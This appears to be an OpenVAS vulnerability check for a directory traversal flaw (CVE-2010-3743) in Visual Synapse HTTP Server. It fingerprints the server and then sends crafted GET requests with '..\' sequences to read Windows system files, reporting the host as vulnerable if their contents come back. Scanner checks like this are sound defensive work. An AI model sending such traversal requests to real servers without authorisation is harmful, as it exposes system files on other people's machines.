###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vshttp_server_dir_traversal_vuln.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# Visual Synapse HTTP Server Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801526");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2010-10-18 15:37:53 +0200 (Mon, 18 Oct 2010)");
  script_cve_id("CVE-2010-3743");
  script_bugtraq_id(43830);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Visual Synapse HTTP Server Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("Host/runs_windows");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15216/");
  script_xref(name:"URL", value:"http://www.syhunt.com/?n=Advisories.Vs-httpd-dirtrav");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/514167/100/0/threaded");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to launch directory
  traversal attack and gain sensitive information about the remote system's directory contents.");

  script_tag(name:"affected", value:"Visual Synapse HTTP Server 1.0 RC3, 1.0 RC2, 1.0 RC1 and 0.60
  and prior");

  script_tag(name:"insight", value:"An input validation error is present in the server which fails
  to validate user supplied request URI containing 'dot dot' sequences (/..\).");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running Visual Synapse HTTP Server and is prone to
  directory traversal vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);
res = http_get_cache(item:"/", port:port);
host = http_host_name(port:port);

if("Visual Synapse HTTP Server" >!< res) exit(0);

traversal_files = traversal_files("windows");

foreach pattern(keys(traversal_files)) {

  file = traversal_files[pattern];
  file = str_replace( find:"/", string:file, replace:"\\" );

  req = string("GET /..\\..\\..\\", file, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n\r\n");
  res = http_keepalive_send_recv(port:port, data:req);

  if(egrep(pattern:pattern, string:res)){
    report = report_vuln_url(port:port, url:file);
    security_message(port:port, data:report);
  }
}

exit(99);